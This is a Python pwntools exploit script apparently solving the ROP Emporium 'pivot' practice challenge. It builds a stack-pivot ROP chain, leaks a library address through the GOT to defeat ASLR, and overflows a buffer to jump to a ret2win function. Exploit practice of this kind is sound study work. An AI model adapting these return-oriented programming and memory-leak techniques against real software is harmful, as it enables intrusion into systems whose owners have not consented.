#!/usr/bin/python

from pwn import *

s = process('./pivot')

s.recvuntil('a place to pivot: ')
place_to_pivot = s.recvline(False)
place_to_pivot = int(place_to_pivot,16)
log.success("place_to_pivot = " + hex(place_to_pivot))
s.clean()


# 0x00400b02: xchg rax, rsp ; ret 
xchg_rax_rsp = 0x400b02
# 0x00400b00: pop rax ; ret
pop_rax = 0x400b00

pivot_stack = p64(pop_rax)
pivot_stack += p64(place_to_pivot)
pivot_stack += p64(xchg_rax_rsp)

elf = ELF('./libpivot.so')
ret2win_offset = elf.sym['ret2win']   # 0xabe
log.success("ret2win_offset = " + hex(ret2win_offset))
foothold_function_offset = elf.sym['foothold_function']   # 0x970
log.success("foothold_function_offset = " + hex(foothold_function_offset))
func_offset = ret2win_offset - foothold_function_offset
log.success('func_offset = ' + hex(func_offset))

puts_plt = 0x400800
main = 0x400996
foothold_function_plt = 0x400850 
foothold_function_got = 0x602048
#0x00400b73: pop rdi ; ret
pop_rdi = 0x400b73


leak_foothold_function_addr = p64(foothold_function_plt)
leak_foothold_function_addr += p64(pop_rdi)
leak_foothold_function_addr += p64(foothold_function_got)
leak_foothold_function_addr += p64(puts_plt)


payload1 = leak_foothold_function_addr
payload1 += p64(main)
payload1 += 'A' * (295 - len(payload1))
payload1 += pivot_stack


'''
context.terminal = ["terminator", "-e"]
gdb.attach(s,
"""
b * main
b * pwnme+166
""")
'''


s.sendline(payload1)

s.recvuntil('libpivot.so')
leak = s.recvline(False)
foothold_function = u64(leak + '\x00\x00')
log.success('foothold_function = ' + hex(foothold_function))

ret2win = foothold_function + func_offset


payload2 = 'A' * 40
payload2 += p64(ret2win)

s.sendline(payload2)
s.interactive()
























